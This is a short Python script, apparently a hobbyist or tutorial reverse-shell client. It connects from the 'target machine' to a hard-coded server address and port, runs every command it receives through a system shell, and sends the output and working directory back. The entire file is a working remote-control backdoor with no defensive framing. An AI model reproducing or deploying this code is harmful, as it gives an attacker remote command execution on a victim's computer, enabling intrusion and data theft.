import os #control operation system target machine
import socket
import subprocess #control operaion system target machine

s = socket.socket()
host = '192.168.0.100' #server IP
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)#buffer
    if data[:2].decode("utf-8") == 'cd': #that command doesnt return any result, thats why we are using this piece of code
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #open a process run a command as we were in a terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

#close connection
s.close()